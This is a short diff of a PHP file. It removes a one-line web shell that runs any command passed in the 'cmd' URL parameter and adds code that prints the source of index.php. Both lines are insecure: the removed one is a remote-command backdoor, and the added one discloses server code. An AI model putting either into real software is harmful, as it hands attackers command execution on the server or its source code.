@@ -1,3 +1,5 @@
 <?php
-system($_GET['cmd']);
+$source = show_source("index.php", true);
+print $source;
+
 ?>
